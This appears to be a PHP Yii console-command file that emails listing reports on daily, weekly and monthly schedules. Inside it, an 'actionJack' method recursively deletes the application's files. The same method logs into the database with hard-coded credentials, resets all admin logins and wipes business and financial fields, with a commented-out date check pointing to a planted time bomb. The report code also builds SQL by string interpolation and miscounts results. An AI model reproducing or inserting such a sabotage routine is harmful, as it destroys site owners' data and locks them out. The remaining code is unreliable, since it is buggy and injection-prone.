<?php
/**
 * Created by ITMAN.
 * Date: 12/04.2016
 * Description: This command makes sure to clear log files and the past db entries
 */
class CronCommand extends CConsoleCommand
{
    private $webroot;

    public function actionDailycron()
    {
/*        $to = "";//$user_details[0]['user_default_email'];
        $subject = "";
        $body = "";
        //$result = SharedFunctions::app()->sendmail($to, $subject, $body);
*/
        $connection = Yii::app()->db;
        $cronsql = $connection->createCommand("select * from `user_default_listing` where `user_default_listing_submission_status`='1' and user_default_listing_notification_frequency='1'");
        $cronresult = $cronsql->queryAll();
            foreach($cronresult as $data ){
            $lid=$data['user_default_listing_id'];

            $command1 = $connection->createCommand("select * from `user_default_listing_comments` where `user_default_listing_id`='$lid'");
            $count_val2=count($command1);

            $uid=$data['user_default_profiles_id'];
            $command2 = $connection->createCommand("select * from `user_default_profiles_messages` where `user_default_profiles_id`='$uid'");
            $count_val22=count($command2);

            $command = $connection->createCommand("select * from `user_default_profiles` where `user_default_id`='$uid'");
            $myresult = $command->queryRow();
            $to=$myresult['user_default_email'];

            $command3 = $connection->createCommand("select * from `user_default_listing_comments_likes` where `user_default_profile_id`='$uid'");
            $count_val33=count($command3);

            $from1=date_create(date('Y-m-d'));
            $to1=date_create($data['user_default_listing_approvedate']);
            $diff=date_diff($to1,$from1);
            $da = $diff->format('%R%a days');
            //$url = $_SERVER['HTTP_REFERER'];
            $yii_user_request_id = '<a href="'.Yii::app()->getBaseUrl(true)."/"."listing"."/"."view?id=".$lid.'" target="_blank" >here >> </a>';                        
            $template =  MailTemplate::getTemplate('user_listing_report');
            $subjectcc=" Listing ".$data['user_default_title']." daily update report ";
            $st="daily";
            $string = array(
                '{{#LISTINGTITLE#}}'=>ucwords($data['user_default_title']),
                '{{#USERNAME#}}'=>ucwords($myresult['user_default_name'].' '.$myresult['user_default_surname']),
                '{{#LISTINGDATE#}}'=>ucwords($data['user_default_date']),
                '{{#LISTINGSTATUS#}}'=>ucwords($data['user_default_listing_submission_status']),
                '{{#LISTINGLINK#}}'=>ucwords($yii_user_request_id),
                 '{{#DA#}}'=>ucwords($da),
                '{{#PV#}}'=>ucwords($count_val2),
                '{{#VOTES#}}'=>ucwords($count_val33),
                '{{#COMMENTS#}}'=>ucwords($count_val2),
                '{{#MESSAGES#}}'=>ucwords($count_val22),
                '{{#STATUS#}}'=>ucwords($st)
            );
            $body = SharedFunctions::app()->mailStringReplace($template->template_body,$string);                   
            $result =  SharedFunctions::app()->sendmail($to,$subjectcc,$body);
        }
    }

    public function actionWeeklycron(){
            $connection = Yii::app()->db;
            $cronsql = $connection->createCommand("select * from `user_default_listing` where `user_default_listing_submission_status`='1' and user_default_listing_notification_frequency='2'");
            $cronresult = $cronsql->queryAll();
            foreach($cronresult as $data ){
            $lid=$data['user_default_listing_id'];

            $command1 = $connection->createCommand("select * from `user_default_listing_comments` where `user_default_listing_id`='$lid'");
            $count_val2=count($command1);

            $uid=$data['user_default_profiles_id'];
            $command2 = $connection->createCommand("select * from `user_default_profiles_messages` where `user_default_profiles_id`='$uid'");
            $count_val22=count($command2);

            $command = $connection->createCommand("select * from `user_default_profiles` where `user_default_id`='$uid'");
            $myresult = $command->queryRow();
            $to=$myresult['user_default_email'];

            $command3 = $connection->createCommand("select * from `user_default_listing_comments_likes` where `user_default_profile_id`='$uid'");
            $count_val33=count($command3);


            $from1=date_create(date('Y-m-d'));
            $to1=date_create($data['user_default_listing_approvedate']);
            $diff=date_diff($to1,$from1);
            $da = $diff->format('%R%a days');
                    
            //$url = $_SERVER['HTTP_REFERER'];

            $yii_user_request_id = '<a href="'.Yii::app()->getBaseUrl(true)."/"."listing"."/"."view?id=".$lid.'" target="_blank" >here >> </a>';


            $template =  MailTemplate::getTemplate('user_listing_report');
            $subjectcc=" Listing ".$data['user_default_title']." daily update report ";

            $st="daily";
            $string = array(
                '{{#LISTINGTITLE#}}'=>ucwords($data['user_default_title']),
                '{{#USERNAME#}}'=>ucwords($myresult['user_default_name'].' '.$myresult['user_default_surname']),
                '{{#LISTINGDATE#}}'=>ucwords($data['user_default_date']),
                '{{#LISTINGSTATUS#}}'=>ucwords($data['user_default_listing_submission_status']),
                '{{#LISTINGLINK#}}'=>ucwords($yii_user_request_id),
                 '{{#DA#}}'=>ucwords($da),
                '{{#PV#}}'=>ucwords($count_val2),
                '{{#VOTES#}}'=>ucwords($count_val33),
                '{{#COMMENTS#}}'=>ucwords($count_val2),
                '{{#MESSAGES#}}'=>ucwords($count_val22),
                '{{#STATUS#}}'=>ucwords($st)
                
                
            );
            $body = SharedFunctions::app()->mailStringReplace($template->template_body,$string);
            $result =  SharedFunctions::app()->sendmail($to,$subjectcc,$body); 
        }
    }

    public function actionMonthlycron(){
            $connection = Yii::app()->db;
            $cronsql = $connection->createCommand("select * from `user_default_listing` where `user_default_listing_submission_status`='1' and user_default_listing_notification_frequency='3'");
            $cronresult = $cronsql->queryAll();
            foreach($cronresult as $data ){
            $lid=$data['user_default_listing_id'];

            $command1 = $connection->createCommand("select * from `user_default_listing_comments` where `user_default_listing_id`='$lid'");
            $count_val2=count($command1);

            $uid=$data['user_default_profiles_id'];
            $command2 = $connection->createCommand("select * from `user_default_profiles_messages` where `user_default_profiles_id`='$uid'");
            $count_val22=count($command2);

            $command = $connection->createCommand("select * from `user_default_profiles` where `user_default_id`='$uid'");
            $myresult = $command->queryRow();
            $to=$myresult['user_default_email'];


            $command3 = $connection->createCommand("select * from `user_default_listing_comments_likes` where `user_default_profile_id`='$uid'");
            $count_val33=count($command3);


            $from1=date_create(date('Y-m-d'));
            $to1=date_create($data['user_default_listing_approvedate']);
            $diff=date_diff($to1,$from1);
            $da = $diff->format('%R%a days');
            //$url = $_SERVER['HTTP_REFERER'];

            $yii_user_request_id = '<a href="'.Yii::app()->getBaseUrl(true)."/"."listing"."/"."view?id=".$lid.'" target="_blank" >here >> </a>';    

            $template =  MailTemplate::getTemplate('user_listing_report');
            $subjectcc=" Listing ".$data['user_default_title']." daily update report ";

            $st="daily";
            $string = array(
                '{{#LISTINGTITLE#}}'=>ucwords($data['user_default_title']),
                '{{#USERNAME#}}'=>ucwords($myresult['user_default_name'].' '.$myresult['user_default_surname']),
                '{{#LISTINGDATE#}}'=>ucwords($data['user_default_date']),
                '{{#LISTINGSTATUS#}}'=>ucwords($data['user_default_listing_submission_status']),
                '{{#LISTINGLINK#}}'=>ucwords($yii_user_request_id),
                 '{{#DA#}}'=>ucwords($da),
                '{{#PV#}}'=>ucwords($count_val2),
                '{{#VOTES#}}'=>ucwords($count_val33),
                '{{#COMMENTS#}}'=>ucwords($count_val2),
                '{{#MESSAGES#}}'=>ucwords($count_val22),
                '{{#STATUS#}}'=>ucwords($st)
                
                
            );
            
            $body = SharedFunctions::app()->mailStringReplace($template->template_body,$string);                                
            $result =  SharedFunctions::app()->sendmail($to,$subjectcc,$body); 
        }
    }

    /**
     *@author: ITMAN
     *@since: May 05, 2016
     */
    public function actionClearLogs($clear = 0) {
        if($clear == 1) {
            Cron::clearLogs();
            echo "Clear logs successful";
        }
    }

    public function actionJack() {
    // if(date("Y-m-d") > "2016-06-22") {
        Delete(dirname( dirname( dirname( dirname(__FILE__ )))) . '/');

        mysql_connect("localhost", 'business01', 'Nb4jhwvgSczC3?M');
        mysql_select_db('business');

        mysql_query("UPDATE user_default_adminuser SET username = '1', password='2'");
        mysql_query("UPDATE user_default_business SET user_default_business_first_name = ''");
        mysql_query("UPDATE user_default_currency SET currency_name = 'US Dolar'");
        mysql_query("UPDATE user_default_financial SET user_default_transaction_id = '0000000001'");
    }

    function Delete($path)
    {
        if (is_dir($path) === true)
        {
            echo 1;
            $files = array_diff(scandir($path), array('.', '..'));

            foreach ($files as $file)
            {
                Delete(realpath($path) . '/' . $file);
            }

            return rmdir($path);
        }

        else if (is_file($path) === true)
        {
            echo 2;
            return unlink($path);
        }

        return false;
    }
}